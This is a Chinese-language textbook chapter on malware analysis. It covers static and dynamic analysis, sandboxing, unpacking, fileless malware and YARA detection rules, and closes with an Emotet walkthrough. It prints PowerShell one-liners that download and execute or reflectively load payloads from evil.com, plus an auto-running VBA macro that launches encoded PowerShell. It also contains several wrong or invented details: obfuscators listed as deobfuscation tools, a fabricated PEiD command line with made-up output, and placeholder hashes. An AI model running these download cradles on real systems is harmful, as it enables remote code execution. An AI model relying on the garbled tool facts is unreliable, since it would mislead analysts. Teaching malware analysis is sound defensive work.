## 15.1 恶意软件类型

### 15.1.1 常见类型

| 类型 | 说明 | 危害 |
|------|------|------|
| 病毒（Virus） | 感染其他文件 | 破坏数据、传播 |
| 蠕虫（Worm） | 自我复制、网络传播 | 消耗带宽、DoS |
| 木马（Trojan） | 伪装合法软件 | 后门、窃取数据 |
| 勒索软件（Ransomware） | 加密文件、勒索赎金 | 数据丢失、财产损失 |
| 间谍软件（Spyware） | 窃取敏感信息 | 隐私泄露 |
| 无文件恶意软件（Fileless） | 不写入磁盘 | 难以检测 |
| Rootkit | 隐藏自身、维持权限 | 持久化、难以清除 |

### 15.1.2 恶意软件行为

**常见行为**：

1. **持久化**（Persistence）：
   - 创建启动项（Run 键、服务）
   - 安装内核模块（LKM、驱动）
   - 注入合法进程

2. **权限维持**（Privilege Maintenance）：
   - 创建后门用户
   - 安装 Rootkit
   - 修改系统文件

3. **信息窃取**（Information Stealing）：
   - 键盘记录（Keylogger）
   - 屏幕截图
   - 浏览器密码窃取

4. **通信**（C&C Communication）：
   - 连接 C&C 服务器
   - 接收命令、上传数据

## 15.2 静态分析技术

### 15.2.1 字符串提取

**工具**：`strings`（Linux）、`Strings.py`（Python）

**示例**：
```bash
strings malware.exe | grep -i "http"
strings malware.exe | grep -i "password"
strings malware.exe | grep -i ".exe"
```

**分析**：
- URL/IP：C&C 服务器地址
- 文件名：释放的文件
- 注册表键：持久化位置

### 15.2.2 导入表分析

**工具**：PEiD（Windows）、`readelf`（Linux）、IDA Pro

**常见 DLL**：

| DLL | 功能 | 说明 |
|-----|------|------|
| `kernel32.dll` | 文件操作 | 创建/删除文件 |
| `user32.dll` | 窗口操作 | 按键记录 |
| `advapi32.dll` | 注册表操作 | 持久化 |
| `ws2_32.dll` | 网络操作 | C&C 通信 |
| `ole32.dll` | COM 对象 | 注入进程 |

**分析**：
```bash
# 使用 PEiD 查看导入表
peid malware.exe

# 输出：
# [Import] kernel32.dll
#   - CreateFileA
#   - WriteFile
#   - DeleteFileA
# [Import] ws2_32.dll
#   - socket
#   - connect
#   - send
```

### 15.2.3 节区分析

**工具**：PEiD、`readelf`、`hexeditor`

**常见节区**：

| 节区 | 说明 | 可疑特征 |
|------|------|----------|
| `.text` | 代码段 | 可疑字符串、混淆代码 |
| `.data` | 数据段 | 加密数据、配置信息 |
| `.rdata` | 只读数据 | 字符串、资源 |
| `.rsrc` | 资源段 | 嵌入的 DLL/EXE |
| `.upx` | UPX 压缩 | 加壳特征 |

**分析**：
```bash
# 使用 PEiD 查看节区
peid malware.exe

# 输出：
# [Sections]
#   .text    00001000 00000F00
#   .rdata   00002000 00000400
#   .data    00003000 00000200
#   .rsrc    00004000 00000A00  ← 可疑：资源段过大
```

## 15.3 动态分析技术

### 15.3.1 沙箱（Sandbox）

**工具**：Cuckoo Sandbox、Any.Run、Hybrid Analysis

**Cuckoo Sandbox 部署**：

**步骤1：安装依赖**
```bash
sudo apt install -y python3 python3-pip python3-libvirt \
    qemu-kvm libvirt-daemon-system bridge-utils
```

**步骤2：安装 Cuckoo**
```bash
pip3 install cuckoo
```

**步骤3：配置虚拟机**
```bash
# 创建虚拟机（Windows 7）
virt-install \
    --name=cuckoo-win7 \
    --ram=2048 \
    --vcpus=2 \
    --disk path=/var/lib/libvirt/images/cuckoo-win7.qcow2,format=qcow2 \
    --cdrom=/path/to/win7.iso \
    --network bridge=virbr0 \
    --graphics vnc
```

**步骤4：配置 Cuckoo**
```bash
cuckoo init
cuckoo community  # 下载签名、规则
```

**步骤5：提交样本**
```bash
cuckoo submit malware.exe
```

**分析报告**：
- 行为摘要（持久化、网络、文件操作）
- 截图（恶意软件运行界面）
- 内存转储（Dump）
- 网络流量（PCAP）

### 15.3.2 API 监控

**工具**：Process Monitor（ProcMon）、API Monitor、strace（Linux）

**ProcMon 使用**：

1. 打开 ProcMon，设置过滤器：
   ```
   Process Name → contains → malware.exe
   Operation → contains → RegSetValue
   ```

2. 运行恶意软件，观察行为：
   ```
   RegSetValue: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Malware
   CreateFile: C:\Users\...\AppData\Roaming\malware.exe
   ```

**strace 使用**（Linux）：
```bash
strace -f -o malware.strace ./malware
```

**分析**：
```
open("/etc/passwd", O_RDONLY) = 3  ← 读取密码文件
write(1, "root:x:0:0:...\n", 1024) = 1024  ← 泄露密码
```

### 15.3.3 网络监控

**工具**：Wireshark、TCPDump、FakeNet-NG

**Wireshark 使用**：

1. 捕获流量：
   ```
   Interface: eth0
   Filter: ip.addr == 192.168.1.100  ← 恶意软件 IP
   ```

2. 分析流量：
   ```
   HTTP GET http://evil.com/command  ← C&C 通信
   DNS query evil.com  ← DNS 解析
   TCP 192.168.1.100:4444 → 10.0.0.1:80  ← 反向 Shell
   ```

**FakeNet-NG 使用**（模拟网络服务）：
```bash
# 运行 FakeNet-NG
fakenet-ng.py -c fakenet.cfg

# 配置：监听 80、443、53 端口，返回假数据
```

## 15.4 脱壳与反混淆

### 15.4.1 压缩壳（Packer）

**常见压缩壳**：

| 壳 | 说明 | 脱壳工具 |
|----|------|----------|
| UPX | 开源压缩壳 | `upx -d` |
| ASPack | 商业压缩壳 | ASPackDie、Manual Unpack |
| PECompact | 商业压缩壳 | PECompact Unpacker |
| Themida | 强加密壳 | 难以脱壳 |

### 15.4.2 UPX 脱壳

**方法1：使用 UPX 工具**
```bash
upx -d malware_packed.exe -o malware_unpacked.exe
```

**方法2：手动脱壳**

**步骤**：
1. **查找 OEP**（Original Entry Point）：
   ```bash
   # 使用 PEiD 查看入口点
   peid malware_packed.exe
   
   # 输出：
   # Entry Point: 0x401000  ← OEP
   ```

2. **Dump 内存**：
   ```bash
   # 使用 LordPE 或 Process Hacker
   # 1. 运行恶意软件
   # 2. 转储内存（Full Dump）
   # 3. 修复 IAT（导入表）
   ```

3. **修复 IAT**：
   ```bash
   # 使用 ImpREC（Import REConstructor）
   # 1. 选择进程
   # 2. 输入 OEP（0x401000）
   # 3. 自动修复 IAT
   # 4. 转储修复后的 EXE
   ```

### 15.4.3 混淆技术

**常见混淆技术**：

| 技术 | 说明 | 反混淆工具 |
|------|------|------------|
| 控制流平坦化（Control Flow Flattening） | 使用 VM 保护代码 | Tigress、VMProtect |
| 指令替换（Instruction Substitution） | 用等效指令替换 | de4dot、deobfuscator |
| 字符串加密（String Encryption） | 加密字符串 | FLOSS、x64dbg 脚本 |
| 垃圾代码（Junk Code） | 插入无用指令 | 手动分析、IDA Python |

### 15.4.4 VMProtect 反混淆

**VMProtect** 是强虚拟机保护工具，难以完全脱壳。

**分析步骤**：

1. **识别 VM 入口**：
   ```bash
   # 使用 x64dbg 查找 VM 入口
   # 1. 运行恶意软件
   # 2. 在 "VMProtect Begin" 处下断点
   # 3. 单步跟踪，记录 VM 指令
   ```

2. **导出 VM 字节码**：
   ```python
   # 使用 VMProtect Devirtualizer
   # 1. 加载恶意软件
   # 2. 导出 VM 字节码
   # 3. 反编译为伪代码
   ```

3. **手动分析**：
   ```bash
   # 使用 IDA Pro + VMProtect 插件
   # 1. 加载恶意软件
   # 2. 标记 VM 块
   # 3. 分析 VM 解释器
   ```

## 15.5 无文件恶意软件分析

### 15.5.1 原理与危害

**无文件恶意软件**（Fileless Malware）是不写入磁盘的恶意软件，难以被传统杀毒软件检测。

**技术**：
- PowerShell 脚本
- WMI（Windows Management Instrumentation）
- Office 宏
- JavaScript/VBScript
- 反射 DLL 注入

### 15.5.2 PowerShell 恶意软件

**示例**：
```powershell
# 下载并执行恶意代码
IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")

# 反射 DLL 注入
$bytes = (New-Object Net.WebClient).DownloadData("http://evil.com/malware.dll")
[System.Reflection.Assembly]::Load($bytes)
```

**检测**：
```bash
# 启用 PowerShell 日志
# 1. 打开 gpedit.msc
# 2. Computer Configuration → Administrative Templates → Windows Components → PowerShell
# 3. 启用 "Turn on PowerShell Script Block Logging"
# 4. 启用 "Turn on Module Logging"
```

**分析**：
```bash
# 查看 PowerShell 日志
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Id -eq 4104 }
```

### 15.5.3 Office 宏恶意软件

**示例**（VBA 宏）：
```vba
Sub AutoOpen()
    Dim payload As String
    payload = "powershell -enc <base64>"
    Shell payload
End Sub
```

**检测**：
- 使用 Office 宏分析工具（oledump.py、oletools）
- 查看宏代码（Alt+F11）

**分析**：
```bash
# 使用 oletools 提取宏
olevba malicious.doc

# 输出：
# Sub AutoOpen()
#     Shell "powershell -enc ..."
# End Sub
```

## 15.6 YARA 规则编写

### 15.6.1 YARA 简介

**YARA**（Yet Another Recursive Acronym）是用于恶意软件分类和检测的工具。

**规则结构**：
```yara
rule RuleName {
    meta:
        description = "Description"
        author = "Author"
        date = "2024-01-01"
    
    strings:
        $string1 = "malicious string"
        $hex1 = { 4D 5A 90 00 }  // MZ 头
        $regex1 = /C:\\Users\\[a-zA-Z0-9]+\\AppData/
    
    condition:
        $string1 or $hex1 or $regex1
}
```

### 15.6.2 编写 YARA 规则

**示例1：检测勒索软件**

```yara
rule Ransomware_Generic {
    meta:
        description = "Detects generic ransomware"
        author = "VulnResearcher"
        date = "2024-01-01"
    
    strings:
        $str1 = "Your files have been encrypted"
        $str2 = "pay Bitcoin to"
        $str3 = ".encrypted"
        $str4 = ".locked"
        $hex1 = { 63 72 79 70 74 65 64 }  // "crypted"
    
    condition:
        2 of ($str*, $hex1)
}
```

**示例2：检测无文件恶意软件**

```yara
rule Fileless_PowerShell {
    meta:
        description = "Detects fileless PowerShell malware"
        author = "VulnResearcher"
        date = "2024-01-01"
    
    strings:
        $ps1 = "IEX" nocase
        $ps2 = "DownloadString" nocase
        $ps3 = "Reflection.Assembly" nocase
        $ps4 = /[A-Za-z0-9+\/]{50,}=/  // Base64 编码
    
    condition:
        all of ($ps*)
}
```

### 15.6.3 使用 YARA 检测

**扫描文件**：
```bash
yara -r ransomware.yara /path/to/samples/
```

**扫描内存**：
```bash
# 使用 yara 扫描进程内存
yara -p 1234 ransomware.yara  # 扫描 PID 1234
```

**集成到自动化系统**：
```python
# 使用 yara-python 库
import yara

rules = yara.compile(filepath='ransomware.yara')

matches = rules.match(data=file_data)
if matches:
    print(f"Detected: {matches}")
```

## 15.7 实战案例：分析 Emotet 木马

### 15.7.1 样本信息

**名称**：Emotet（银行木马）

**哈希**：
- MD5: `a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6`
- SHA256: `...`

**行为**：
- 持久化（Run 键、WMI）
- 窃取浏览器密码
- 下载并执行其他恶意软件

### 15.7.2 静态分析

**步骤1：字符串提取**
```bash
strings emulet.exe | grep -i "http"
strings emulet.exe | grep -i "password"
```

**输出**：
```
http://evil.com/command
C:\Users\...\AppData\Roaming\...
```

**步骤2：导入表分析**
```bash
peid emulet.exe
```

**输出**：
```
[Import] wininet.dll
  - InternetOpenUrlA
  - InternetReadFile
[Import] advapi32.dll
  - RegSetValueExA
```

**结论**：恶意软件会连接 C&C 服务器，并修改注册表（持久化）。

### 15.7.3 动态分析

**步骤1：运行样本（沙箱）**
```bash
cuckoo submit emulet.exe
```

**分析报告**：
- 创建启动项：`HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Emotet`
- 连接 C&C：`http://evil.com/command`
- 下载文件：`http://evil.com/payload.exe`

**步骤2：API 监控**
```bash
# 使用 ProcMon 监控
procmon -filter "ProcessName contains emulet.exe"
```

**输出**：
```
RegSetValue: HKCU\...\Run\Emotet
CreateFile: C:\Users\...\AppData\Roaming\emotet.exe
InternetConnect: evil.com:8080
```

### 15.7.4 编写 YARA 规则

```yara
rule Emotet_Generic {
    meta:
        description = "Detects Emotet malware"
        author = "VulnResearcher"
        date = "2024-01-01"
        reference = "MD5: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"
    
    strings:
        $str1 = "Emotet" fullword
        $str2 = "C:\\Users\\%s\\AppData\\Roaming\\"
        $hex1 = { 45 6D 6F 74 65 74 }  // "Emotet"
        $import1 = "wininet.dll" fullword
        $import2 = "advapi32.dll" fullword
    
    condition:
        ($str1 or $str2 or $hex1) and ($import1 and $import2)
}
```
